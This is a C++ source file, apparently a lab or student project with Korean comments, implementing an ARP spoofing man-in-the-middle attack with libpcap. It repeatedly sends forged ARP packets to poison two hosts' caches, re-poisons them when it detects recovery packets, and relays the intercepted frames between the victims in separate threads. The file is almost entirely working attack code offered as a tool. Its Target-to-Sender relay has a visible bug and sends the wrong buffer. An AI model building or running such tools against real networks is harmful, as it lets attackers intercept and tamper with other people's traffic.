#include <thread>
#include <mutex>
#include <vector>
#include <future>
#include <netinet/ip.h>
#include <arpa/inet.h> // inet_ntop 함수를 위한 헤더 파일
#include <iostream>

#include "Utill.h"

#define MAC_ADDR_LEN 6

std::mutex arpMutex;
void SendInfectionPacket(pcap_t *handle, char *InterfaceName, Mac atkMac, Mac senderMac, Mac TargetMac, Ip senderIp, Ip targetIp)
{
    EthArpPacket sender_infect_packet = Sender_Infection(InterfaceName, atkMac, senderMac, senderIp, targetIp);
    EthArpPacket target_infect_packet = Target_Infection(InterfaceName, atkMac, TargetMac, senderIp, targetIp);

    // ARP Spoofing 패킷 전송
    int res_sender = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&sender_infect_packet), sizeof(EthArpPacket));
    if (res_sender != 0)
    {
        fprintf(stderr, "pcap_sendpacket (Sender) return %d error=%s\n", res_sender, pcap_geterr(handle));
    }

    int res_target = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&target_infect_packet), sizeof(EthArpPacket));
    if (res_target != 0)
    {
        fprintf(stderr, "pcap_sendpacket (Target) return %d error=%s\n", res_target, pcap_geterr(handle));
    }
}

void checkRecover(pcap_t *handle, char *InterfaceName, Mac atkMac, Mac senderMac, Mac TargetMac, Ip senderIp, Ip targetIp)
{
    EthArpPacket packet;
    while (true)
    {

        const u_char *received_pkt;
        struct pcap_pkthdr *header;
        int res = pcap_next_ex(handle, &header, &received_pkt);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        if (res == 1)
        {
            // ARP 패킷 처리 (가로채기, 변조, 재전송)
            std::lock_guard<std::mutex> lock(arpMutex);
            EthArpPacket *arpResponsePacket = reinterpret_cast<EthArpPacket *>(const_cast<u_char *>(received_pkt));

            if (checkRecoverPacket(*arpResponsePacket, senderIp, targetIp, TargetMac, senderMac))
            {
                // 재감염 로직 수행
                printf("Detect Recover Pakcet\n");
                SendInfectionPacket(handle, InterfaceName, atkMac, senderMac, TargetMac, senderIp, targetIp);
            }
        }
    }
}

void spoofArpPacket(pcap_t *handle, char *InterfaceName, Mac atkMac, Mac senderMac, Mac TargetMac, Ip senderIp, Ip targetIp)
{
    // 1초마다 감염패킷 보내는 함수
    while (true)
    {
        printf("send Infection\n");
        // ARP Spoofing 패킷 생성
        SendInfectionPacket(handle, InterfaceName, atkMac, senderMac, TargetMac, senderIp, targetIp);
        // 재전송 간격 설정 (예: 1초)
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
}

void SenderToTarget(pcap_t *handle, char *InterfaceName, Mac atkMac, Mac senderMac, Mac TargetMac, Ip SenderIP, Ip TargetIp)
{
    while (true)
    {
        const u_char *received_pkt;
        struct pcap_pkthdr *header;
        int res = pcap_next_ex(handle, &header, &received_pkt);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        if (res == 1)
        {
            // ARP 패킷 처리 (가로채기, 변조, 재전송)
            std::lock_guard<std::mutex> lock(arpMutex);
            EthArpPacket *packet = reinterpret_cast<EthArpPacket *>(const_cast<u_char *>(received_pkt));
            if (packet->eth_.smac() == senderMac && packet->eth_.dmac() == atkMac)
            {
                // 패킷의 Ethernet 헤더 및 ARP 헤더 수정
                packet->eth_.smac_ = atkMac;
                packet->eth_.dmac_ = TargetMac;

                // 수정된 패킷 데이터 전송
                int res_send = pcap_sendpacket(handle, received_pkt, header->len);
                if (res_send == -1)
                {
                    fprintf(stderr, "Failed to send packet: %s\n", pcap_geterr(handle));
                    // 오류 처리 로직 추가
                }
                else
                {
                    printf("Sender->Target Relay\n");
                }
            }
        }
    }
}

void TargetToSender(pcap_t *handle, char *InterfaceName, Mac atkMac, Mac senderMac, Mac TargetMac, Ip SenderIP, Ip TargetIp)
{
    EthArpPacket packet;
    while (true)
    {

        const u_char *received_pkt;
        struct pcap_pkthdr *header;
        int res = pcap_next_ex(handle, &header, &received_pkt);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        if (res == 1)
        {
            // ARP 패킷 처리 (가로채기, 변조, 재전송)
            std::lock_guard<std::mutex> lock(arpMutex);
            // memcpy(&packet, received_pkt, sizeof(EthArpPacket));
            EthArpPacket *packet = reinterpret_cast<EthArpPacket *>(const_cast<u_char *>(received_pkt));

            if (packet->eth_.smac() == TargetMac && packet->eth_.dmac() == atkMac)
            {

                packet->eth_.smac() = atkMac;
                packet->eth_.dmac() = senderMac;

                int res_send = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
                if (res_send == -1)
                {
                    fprintf(stderr, "Failed to send packet: %s\n", pcap_geterr(handle));
                    // 오류 처리 로직 추가
                }
                else
                {
                    printf("Target->Sender Relay\n");
                }
            }
        }
    }
}

int start_spoofing(char *dev, Ip sip, Ip tip, Mac AtkMac, Ip AtkIp)
{


    // 네트워크 인터페이스(dev)를 열고 핸들(handle) 생성
    char errbuf[PCAP_ERRBUF_SIZE];
    std::vector<pcap_t *> handle_list;

    for(int i=0; i< 4; i++){
        pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 10, errbuf);
        if (handle == nullptr)
        {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            // 실패 시 이전에 열었던 핸들들을 모두 닫음
            for (auto &h : handle_list)
                pcap_close(h);
            return -1;
        }
        handle_list.push_back(handle);
    }
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 10, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Mac senderMac = getSenderMac(AtkMac, AtkIp, sip, dev);
    std::string prinfSednerMac = static_cast<std::string>(senderMac);
    std::cout << "Sender MAC 주소: " << prinfSednerMac << std::endl;

    Mac targetMac = getTargetMac(AtkMac, AtkIp, tip, dev);
    std::string prinfMac = static_cast<std::string>(targetMac);
    std::cout << "Target MAC 주소: " << prinfMac << std::endl
              << std::endl;

    // ARP Spoofing 스레드 생성
    std::thread spoofingThread(spoofArpPacket, handle_list[0], dev, AtkMac, senderMac, targetMac, sip, tip);

    std::thread checkRecoverThread(checkRecover, handle_list[1], dev, AtkMac, senderMac, targetMac, sip, tip);
    // Sedner->Target 릴레이를 처리할 스레드 생성
    std::thread senderToTargetThread(SenderToTarget, handle_list[2], dev, AtkMac, senderMac, targetMac, sip, tip);

    // Target->Sender 릴레이를 처리할 스레드 생성
    std::thread targetToSenderThread(TargetToSender, handle_list[3], dev, AtkMac, senderMac, targetMac, sip, tip);

    // 메인 스레드에서 스레드 종료 대기
    spoofingThread.join();
    senderToTargetThread.join();
    targetToSenderThread.join();
    checkRecoverThread.join();

    for (auto &h : handle_list)
                pcap_close(h);

    return 0;
}

int main(int argc, char *argv[])
{
    if (argc <= 3)
    { // 입력값이 3개 이하면 에러
        usage();
        return -1;
    }

    char *dev = argv[1]; // 네트워크 인터페이스 명

    Mac Attacker_Mac = getMacAddress(dev);
    if (Attacker_Mac == Mac::nullMac())
    {
        fprintf(stderr, "Failed to get Attacker Mac");
        return -1;
    }

    Ip Attacker_Ip = getAttackerIp(dev);

    std::string sender_ip;
    std::string target_ip;
    for (int i = 2; i < argc - 1; i += 2)
    {
        sender_ip = argv[i];
        target_ip = argv[i + 1];
        start_spoofing(dev, Ip(sender_ip), Ip(target_ip), Attacker_Mac, Attacker_Ip);
        // std::future<int> spoof_thread = std::async(std::launch::async, start_spoofing, dev, argv[i], argv[i + 1]);
        // spoof_threads.push_back(std::move(spoof_thread));
    }
    return 0;
}
